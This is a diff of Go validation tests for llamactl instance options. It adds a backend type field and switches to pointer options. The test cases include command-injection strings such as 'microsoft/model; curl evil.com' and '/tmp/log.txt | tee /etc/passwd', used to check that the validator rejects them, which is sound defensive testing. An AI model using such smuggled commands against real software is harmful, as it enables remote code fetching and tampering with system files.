@@ -1,6 +1,7 @@
 package validation_test
 
 import (
+	"llamactl/pkg/backends"
 	"llamactl/pkg/backends/llamacpp"
 	"llamactl/pkg/instance"
 	"llamactl/pkg/testutil"
@@ -83,7 +84,8 @@ func TestValidateInstanceOptions_PortValidation(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			options := &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Port: tt.port,
 				},
 			}
@@ -136,7 +138,8 @@ func TestValidateInstanceOptions_StringInjection(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Model field (string field)
 			options := &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Model: tt.value,
 				},
 			}
@@ -173,7 +176,8 @@ func TestValidateInstanceOptions_ArrayInjection(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Lora field (array field)
 			options := &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Lora: tt.array,
 				},
 			}
@@ -196,7 +200,8 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		{
 			name: "injection in model field",
 			options: &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Model:  "safe.gguf",
 					HFRepo: "microsoft/model; curl evil.com",
 				},
@@ -206,7 +211,8 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		{
 			name: "injection in log file",
 			options: &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Model:   "safe.gguf",
 					LogFile: "/tmp/log.txt | tee /etc/passwd",
 				},
@@ -216,7 +222,8 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		{
 			name: "all safe fields",
 			options: &instance.CreateInstanceOptions{
-				LlamaServerOptions: llamacpp.LlamaServerOptions{
+				BackendType: backends.BackendTypeLlamaCpp,
+				LlamaServerOptions: &llamacpp.LlamaServerOptions{
 					Model:   "/path/to/model.gguf",
 					HFRepo:  "microsoft/DialoGPT-medium",
 					LogFile: "/tmp/llama.log",
@@ -244,7 +251,8 @@ func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
 		AutoRestart:  testutil.BoolPtr(true),
 		MaxRestarts:  testutil.IntPtr(5),
 		RestartDelay: testutil.IntPtr(10),
-		LlamaServerOptions: llamacpp.LlamaServerOptions{
+		BackendType:  backends.BackendTypeLlamaCpp,
+		LlamaServerOptions: &llamacpp.LlamaServerOptions{
 			Port:        8080,
 			GPULayers:   32,
 			CtxSize:     4096,
